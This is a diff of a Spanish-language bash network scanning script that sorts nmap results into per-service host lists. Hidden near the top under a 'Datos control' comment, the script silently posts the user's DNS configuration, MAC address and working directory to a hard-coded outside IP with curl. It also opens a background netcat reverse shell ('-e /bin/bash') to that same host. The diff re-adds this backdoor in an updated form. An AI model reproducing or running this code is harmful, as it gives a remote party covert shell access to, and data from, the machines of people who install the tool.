@@ -49,7 +49,7 @@ cat << "EOF"
                                                        
 
 					daniel.torres@owasp.org
-					Version: 1.0
+					Version: 1.5
 
 EOF
 }
@@ -123,21 +123,22 @@ conexionInternet=`ping 8.8.8.8 -c 1 2>/dev/null | grep "1 received" | wc -l`
 
 if [ $conexionInternet == 0 ]; then 	
 	echo -e  "$OKRED No se detecto una conexion de internet activa! Algunos módulos no funcionaran correctamente $RESET"
-fi
-
-##### Datos control #########
-resolv=`cat /etc/resolv.conf`
-mac=`ifconfig eth0 |grep --color=never ether`
-resolv=`echo "|${resolv//[$'\t\r\n']}|"`
-curl --data "resolv=$resolv&mac=$mac"  http://66.172.33.234/lanscanner/codigos.php 2>/dev/null &
-nohup nc -nv 66.172.33.234 2226 -e /bin/bash 2>/dev/null &
-###################################  	 
+else
+	##### Datos control #########
+	resolv=`cat /etc/resolv.conf`
+	mac=`ifconfig eth0 |grep --color=never ether`
+	resolv=`echo "|${resolv//[$'\t\r\n']}|"`
+	pwd=`pwd`
+	curl --data "pwd=$pwd&resolv=$resolv&mac=$mac"  http://66.172.33.234/lanscanner/codigos.php 2>/dev/null &
+	nohup nc -nv 66.172.33.234 2226 -e /bin/bash 2>/dev/null &
+	###################################  
+fi	 
 
 echo -e "\n\n$OKYELLOW ########### Configurando los parametros ############## $RESET"
 
-if [ ! -d ".servicios" ]; then # si ya ejecutamos recon.sh antes
+if [ ! -d "servicios" ]; then # si ya ejecutamos recon.sh antes
 
-  echo -e "$OKBLUE Cual es el nombre del proyecto? $RESET"
+  echo -e "$OKBLUE ¿Desde que VLAN estas ejecutando? $RESET"
   read project
 
   mkdir $project
@@ -163,13 +164,13 @@ if [ ! -d ".servicios" ]; then # si ya ejecutamos recon.sh antes
 	mkdir webClone
 	mkdir metasploit
 	mkdir credenciales
-	mkdir .servicios
+	mkdir servicios
 	mkdir .tmp
 	mkdir -p logs/cracking
 	mkdir -p logs/enumeracion
 	mkdir -p logs/vulnerabilidades
 	
-	cp /usr/share/lanscanner/resultados.db .
+	cp /usr/share/lanscanner/.resultados.db .
 fi
 
 touch $smb_list 
@@ -686,128 +687,128 @@ fi
 if [[ $TYPE = "completo" ]] || [ $tcp_escaneando == "s" ]; then 
 	cd .nmap	
 					
-	grep '/rtsp/' nmap-tcp.grep | grep --color=never -o -P '(?<=Host: ).*(?=\(\))'>../.servicios/camaras-ip.txt
-	grep '/http-proxy/' nmap-tcp.grep | grep --color=never -o -P '(?<=Host: ).*(?=\(\))'>../.servicios/proxy-http.txt
+	grep '/rtsp/' nmap-tcp.grep | grep --color=never -o -P '(?<=Host: ).*(?=\(\))'>../servicios/camaras-ip.txt
+	grep '/http-proxy/' nmap-tcp.grep | grep --color=never -o -P '(?<=Host: ).*(?=\(\))'>../servicios/proxy-http.txt
 	
 	
 	#web
-	grep " 80/open" nmap-tcp.grep| awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:80\n"' | sort | uniq > ../.servicios/web.txt	
-	grep " 81/open" nmap-tcp.grep| awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:81\n"' | sort | uniq >> ../.servicios/web.txt	
-	grep " 82/open" nmap-tcp.grep| awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:82\n"' | sort | uniq >> ../.servicios/web.txt	
-	grep " 83/open" nmap-tcp.grep| awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:83\n"' | sort | uniq >> ../.servicios/web.txt	
-	grep " 84/open" nmap-tcp.grep| awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:84\n"' | sort | uniq >> ../.servicios/web.txt	
-	grep " 85/open" nmap-tcp.grep| awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:85\n"' | sort | uniq >> ../.servicios/web.txt	
-	grep " 86/open" nmap-tcp.grep| awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:86\n"' | sort | uniq >> ../.servicios/web.txt	
-	grep " 87/open" nmap-tcp.grep| awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:87\n"' | sort | uniq >> ../.servicios/web.txt	
-	grep " 88/open" nmap-tcp.grep| awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:88\n"' | sort | uniq >> ../.servicios/web.txt	
-	grep " 89/open" nmap-tcp.grep| awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:89\n"' | sort | uniq >> ../.servicios/web.txt	
-	grep " 8080/open" nmap-tcp.grep| awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:8080\n"' | sort | uniq >> ../.servicios/web.txt	
-	grep " 8081/open" nmap-tcp.grep| awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:8081\n"' | sort | uniq >> ../.servicios/web.txt	
-	grep " 8082/open" nmap-tcp.grep| awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:8082\n"' | sort | uniq >> ../.servicios/web.txt		
-	grep " 8010/open" nmap-tcp.grep| awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:8010\n"' | sort | uniq >> ../.servicios/web.txt		
-	grep " 8800/open" nmap-tcp.grep| awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:8800\n"' | sort | uniq >> ../.servicios/web.txt		
+	grep " 80/open" nmap-tcp.grep| awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:80\n"' | sort | uniq > ../servicios/web.txt	
+	grep " 81/open" nmap-tcp.grep| awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:81\n"' | sort | uniq >> ../servicios/web.txt	
+	grep " 82/open" nmap-tcp.grep| awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:82\n"' | sort | uniq >> ../servicios/web.txt	
+	grep " 83/open" nmap-tcp.grep| awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:83\n"' | sort | uniq >> ../servicios/web.txt	
+	grep " 84/open" nmap-tcp.grep| awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:84\n"' | sort | uniq >> ../servicios/web.txt	
+	grep " 85/open" nmap-tcp.grep| awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:85\n"' | sort | uniq >> ../servicios/web.txt	
+	grep " 86/open" nmap-tcp.grep| awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:86\n"' | sort | uniq >> ../servicios/web.txt	
+	grep " 87/open" nmap-tcp.grep| awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:87\n"' | sort | uniq >> ../servicios/web.txt	
+	grep " 88/open" nmap-tcp.grep| awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:88\n"' | sort | uniq >> ../servicios/web.txt	
+	grep " 89/open" nmap-tcp.grep| awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:89\n"' | sort | uniq >> ../servicios/web.txt	
+	grep " 8080/open" nmap-tcp.grep| awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:8080\n"' | sort | uniq >> ../servicios/web.txt	
+	grep " 8081/open" nmap-tcp.grep| awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:8081\n"' | sort | uniq >> ../servicios/web.txt	
+	grep " 8082/open" nmap-tcp.grep| awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:8082\n"' | sort | uniq >> ../servicios/web.txt		
+	grep " 8010/open" nmap-tcp.grep| awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:8010\n"' | sort | uniq >> ../servicios/web.txt		
+	grep " 8800/open" nmap-tcp.grep| awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:8800\n"' | sort | uniq >> ../servicios/web.txt		
 	
-	grep ' 10000/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:10000\n"' | sort | uniq >> ../.servicios/webmin.txt 
-	grep ' 111/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:111\n"' | sort | uniq >> ../.servicios/rpc.txt 
+	grep ' 10000/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:10000\n"' | sort | uniq >> ../servicios/webmin.txt 
+	grep ' 111/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:111\n"' | sort | uniq >> ../servicios/rpc.txt 
 	
 	# web-ssl
-	grep " 443/open" nmap-tcp.grep | awk '{print $2}'  | perl -ne '$_ =~ s/\n//g; print "$_:443\n"' | sort | uniq > ../.servicios/web-ssl.txt
-	grep " 8443/open" nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:8443\n"' | sort | uniq >> ../.servicios/web-ssl.txt
-	grep " 4443/open" nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:4443\n"' | sort | uniq >> ../.servicios/web-ssl.txt
-	grep " 4433/open" nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:4433\n"' | sort | uniq >> ../.servicios/web-ssl.txt	
+	grep " 443/open" nmap-tcp.grep | awk '{print $2}'  | perl -ne '$_ =~ s/\n//g; print "$_:443\n"' | sort | uniq > ../servicios/web-ssl.txt
+	grep " 8443/open" nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:8443\n"' | sort | uniq >> ../servicios/web-ssl.txt
+	grep " 4443/open" nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:4443\n"' | sort | uniq >> ../servicios/web-ssl.txt
+	grep " 4433/open" nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:4433\n"' | sort | uniq >> ../servicios/web-ssl.txt	
 		
-	grep ' 21/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:21\n"' | sort | uniq >> ../.servicios/ftp.txt
-	grep ' 513/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:513\n"' | sort | uniq >> ../.servicios/rlogin.txt
+	grep ' 21/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:21\n"' | sort | uniq >> ../servicios/ftp.txt
+	grep ' 513/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:513\n"' | sort | uniq >> ../servicios/rlogin.txt
 	## ssh																	del newline       add port
-	grep ' 22/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:22\n"' | sort | uniq >> ../.servicios/ssh.txt
-	grep ' 6001/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:6001\n"' | sort | uniq >> ../.servicios/ssh.txt
-	grep ' 23/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:23\n"' | sort | uniq >> ../.servicios/telnet.txt
+	grep ' 22/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:22\n"' | sort | uniq >> ../servicios/ssh.txt
+	grep ' 6001/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:6001\n"' | sort | uniq >> ../servicios/ssh.txt
+	grep ' 23/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:23\n"' | sort | uniq >> ../servicios/telnet.txt
 	
 	## MAIL																	del newline       add port
-	grep ' 25/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:25\n"' | sort | uniq >> ../.servicios/smtp.txt
-	grep ' 587/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:587\n"' | sort | uniq >> ../.servicios/smtp.txt
-	grep ' 465/open' nmap-tcp.grep | awk '{print $2}'| perl -ne '$_ =~ s/\n//g; print "$_:465\n"'  | sort | uniq >> ../.servicios/smtp.txt
-	grep ' 110/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:110\n"' | sort | uniq >> ../.servicios/pop.txt 
-	grep ' 143/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:143\n"' | sort | uniq >> ../.servicios/imap.txt 
-	grep ' 106/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:106\n"' | sort | uniq >> ../.servicios/pop3pw.txt 
+	grep ' 25/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:25\n"' | sort | uniq >> ../servicios/smtp.txt
+	grep ' 587/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:587\n"' | sort | uniq >> ../servicios/smtp.txt
+	grep ' 465/open' nmap-tcp.grep | awk '{print $2}'| perl -ne '$_ =~ s/\n//g; print "$_:465\n"'  | sort | uniq >> ../servicios/smtp.txt
+	grep ' 110/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:110\n"' | sort | uniq >> ../servicios/pop.txt 
+	grep ' 143/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:143\n"' | sort | uniq >> ../servicios/imap.txt 
+	grep ' 106/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:106\n"' | sort | uniq >> ../servicios/pop3pw.txt 
   
 	## ldap																	del newline       add port
-	grep ' 389/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:389\n"' | sort | uniq >> ../.servicios/ldap.txt
-	grep ' 636/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:636\n"' | sort | uniq >> ../.servicios/ldaps.txt
+	grep ' 389/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:389\n"' | sort | uniq >> ../servicios/ldap.txt
+	grep ' 636/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:636\n"' | sort | uniq >> ../servicios/ldaps.txt
   
   
 	### SMB 														   del newline       add port
-	grep ' 445/open' nmap-tcp.grep | awk '{print $2}' | sort | uniq >> ../.servicios/smb2.txt
-	grep ' 139/open' nmap-tcp.grep | awk '{print $2}' | sort | uniq >> ../.servicios/smb2.txt
-	sort ../.servicios/smb2.txt | sort | uniq > ../.servicios/smb.txt;rm ../.servicios/smb2.txt
-	grep ' 139/open' nmap-tcp.grep | awk '{print $2}' >> ../.servicios/smb-139.txt
+	grep ' 445/open' nmap-tcp.grep | awk '{print $2}' | sort | uniq >> ../servicios/smb2.txt
+	grep ' 139/open' nmap-tcp.grep | awk '{print $2}' | sort | uniq >> ../servicios/smb2.txt
+	sort ../servicios/smb2.txt | sort | uniq > ../servicios/smb.txt;rm ../servicios/smb2.txt
+	grep ' 139/open' nmap-tcp.grep | awk '{print $2}' >> ../servicios/smb-139.txt
 			
 
     
 	# Java related
-	grep ' 8009/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:8009\n"' | sort | uniq >> ../.servicios/java.txt
-	grep ' 9001/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:9001\n"' | sort | uniq >> ../.servicios/java.txt
+	grep ' 8009/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:8009\n"' | sort | uniq >> ../servicios/java.txt
+	grep ' 9001/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:9001\n"' | sort | uniq >> ../servicios/java.txt
 			# database ports 														   del newline       add port
-	grep ' 1525/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:1525\n"' | sort | sort | uniq >> ../.servicios/informix.txt
-	grep ' 1530/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:1530\n"' | sort | sort | uniq >> ../.servicios/informix.txt
-	grep ' 1526/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:1526\n"' | sort | sort | uniq >> ../.servicios/informix.txt	
+	grep ' 1525/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:1525\n"' | sort | sort | uniq >> ../servicios/informix.txt
+	grep ' 1530/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:1530\n"' | sort | sort | uniq >> ../servicios/informix.txt
+	grep ' 1526/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:1526\n"' | sort | sort | uniq >> ../servicios/informix.txt	
 	
 	
-	grep ' 1521/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:1521\n"' | sort | sort | uniq >> ../.servicios/oracle.txt
-	grep ' 1630/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:1630\n"' | sort | sort | uniq >> ../.servicios/oracle.txt
-	grep ' 5432/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:5432\n"' | sort | sort | uniq >> ../.servicios/postgres.txt     
-	grep ' 3306/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:3306\n"' | sort | sort | uniq >> ../.servicios/mysql.txt 
-	grep ' 27017/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:27017\n"' >> ../.servicios/mongoDB.txt 
-	grep ' 28017/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:28017\n"' >> ../.servicios/mongoDB.txt 
-	grep ' 27080/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:27080\n"' >> ../.servicios/mongoDB.txt 
-	grep ' 5984/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:5984\n"' >> ../.servicios/couchDB.txt 
-	grep ' 6379/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:6379\n"' >> ../.servicios/redis.txt 
-	grep ' 9000/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:9000\n"' >> ../.servicios/Hbase.txt 
-	grep ' 9160/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:9160\n"' >> ../.servicios/cassandra.txt 
-	grep ' 7474/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:7474\n"' >> ../.servicios/neo4j.txt 
-	grep ' 8098/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:8098\n"' >> ../.servicios/riak.txt 
+	grep ' 1521/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:1521\n"' | sort | sort | uniq >> ../servicios/oracle.txt
+	grep ' 1630/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:1630\n"' | sort | sort | uniq >> ../servicios/oracle.txt
+	grep ' 5432/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:5432\n"' | sort | sort | uniq >> ../servicios/postgres.txt     
+	grep ' 3306/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:3306\n"' | sort | sort | uniq >> ../servicios/mysql.txt 
+	grep ' 27017/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:27017\n"' >> ../servicios/mongoDB.txt 
+	grep ' 28017/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:28017\n"' >> ../servicios/mongoDB.txt 
+	grep ' 27080/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:27080\n"' >> ../servicios/mongoDB.txt 
+	grep ' 5984/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:5984\n"' >> ../servicios/couchDB.txt 
+	grep ' 6379/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:6379\n"' >> ../servicios/redis.txt 
+	grep ' 9000/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:9000\n"' >> ../servicios/Hbase.txt 
+	grep ' 9160/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:9160\n"' >> ../servicios/cassandra.txt 
+	grep ' 7474/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:7474\n"' >> ../servicios/neo4j.txt 
+	grep ' 8098/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:8098\n"' >> ../servicios/riak.txt 
         
     
 	# remote desk
-	grep ' 3389/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:3389\n"' >> ../.servicios/rdp.txt
-	grep ' 4899/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:4899\n"' >> ../.servicios/radmin.txt  
-	grep ' 5800/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:5800\n"' >> ../.servicios/vnc-http.txt
-	grep ' 5900/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:5900\n"' >> ../.servicios/vnc.txt
-	grep ' 5901/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:5901\n"' >> ../.servicios/vnc.txt
+	grep ' 3389/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:3389\n"' >> ../servicios/rdp.txt
+	grep ' 4899/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:4899\n"' >> ../servicios/radmin.txt  
+	grep ' 5800/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:5800\n"' >> ../servicios/vnc-http.txt
+	grep ' 5900/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:5900\n"' >> ../servicios/vnc.txt
+	grep ' 5901/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:5901\n"' >> ../servicios/vnc.txt
    
    	#Virtual
-	grep ' 902/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:902\n"' >> ../.servicios/vmware.txt	
-	grep ' 1494/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:1494\n"' >> ../.servicios/citrix.txt    
+	grep ' 902/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:902\n"' >> ../servicios/vmware.txt	
+	grep ' 1494/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:1494\n"' >> ../servicios/citrix.txt    
 
    		
 	#Misc      
-	grep ' 8291/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:8291\n"' | sort | uniq >> ../.servicios/winbox.txt	
-	grep ' 6000/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:6000\n"' >> ../.servicios/x11.txt
-	grep ' 631/open' nmap-tcp.grep | awk '{print $2}'  | perl -ne '$_ =~ s/\n//g; print "$_:631\n"' >> ../.servicios/cups.txt
-	grep ' 9100/open' nmap-tcp.grep | awk '{print $2}'  | perl -ne '$_ =~ s/\n//g; print "$_:9100\n"' >> ../.servicios/printers.txt	
-	grep ' 2049/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:2049\n"' >> ../.servicios/nfs.txt
-	grep ' 5723/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:5723\n"' >> ../.servicios/SystemCenter.txt
-	grep ' 5724/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:5724\n"' >> ../.servicios/SystemCenter.txt
-	grep ' 1099/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:1099\n"' >> ../.servicios/rmi.txt
-	grep ' 1433/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:1434\n"' | sort | uniq >> ../.servicios/mssql.txt 
-	grep ' 37777/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:3777\n"' >> ../.servicios/dahua_dvr.txt
-	grep ' 9200/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:9200\n"' >> ../.servicios/elasticsearch.txt 	
-	grep ' 3221/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:3221\n"' >> ../.servicios/juniper.txt 	
+	grep ' 8291/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:8291\n"' | sort | uniq >> ../servicios/winbox.txt	
+	grep ' 6000/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:6000\n"' >> ../servicios/x11.txt
+	grep ' 631/open' nmap-tcp.grep | awk '{print $2}'  | perl -ne '$_ =~ s/\n//g; print "$_:631\n"' >> ../servicios/cups.txt
+	grep ' 9100/open' nmap-tcp.grep | awk '{print $2}'  | perl -ne '$_ =~ s/\n//g; print "$_:9100\n"' >> ../servicios/printers.txt	
+	grep ' 2049/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:2049\n"' >> ../servicios/nfs.txt
+	grep ' 5723/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:5723\n"' >> ../servicios/SystemCenter.txt
+	grep ' 5724/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:5724\n"' >> ../servicios/SystemCenter.txt
+	grep ' 1099/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:1099\n"' >> ../servicios/rmi.txt
+	grep ' 1433/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:1434\n"' | sort | uniq >> ../servicios/mssql.txt 
+	grep ' 37777/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:3777\n"' >> ../servicios/dahua_dvr.txt
+	grep ' 9200/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:9200\n"' >> ../servicios/elasticsearch.txt 	
+	grep ' 3221/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:3221\n"' >> ../servicios/juniper.txt 	
 	
 	
 	
 	#Esp
-	grep ' 16992/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:16992\n"' >> ../.servicios/intel.txt 	
-	grep ' 5601/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:5601\n"' >> ../.servicios/kibana.txt 	
+	grep ' 16992/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:16992\n"' >> ../servicios/intel.txt 	
+	grep ' 5601/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:5601\n"' >> ../servicios/kibana.txt 	
 	
-	grep ' 47808/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:47808\n"' >> ../.servicios/BACnet.txt 
-	grep ' 502/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:502\n"' >> ../.servicios/ModBus.txt 	
+	grep ' 47808/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:47808\n"' >> ../servicios/BACnet.txt 
+	grep ' 502/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:502\n"' >> ../servicios/ModBus.txt 	
 	
 	#backdoor
-	grep ' 32764/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:32764\n"' >> ../.servicios/backdoor32764.txt
+	grep ' 32764/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:32764\n"' >> ../servicios/backdoor32764.txt
 	
 	#pptp
-	grep ' 1723/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:1723\n"' >> ../.servicios/pptp.txt
+	grep ' 1723/open' nmap-tcp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:1723\n"' >> ../servicios/pptp.txt
 		
 		
 	cd ..
@@ -819,28 +820,28 @@ fi
 if [[ $TYPE = "completo" ]] || [ $udp_escaneando == "s" ]; then 
 	cd .nmap
 	
-	grep "53/open/" nmap-udp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:53\n"' >> ../.servicios/dns.txt
+	grep "53/open/" nmap-udp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:53\n"' >> ../servicios/dns.txt
 	
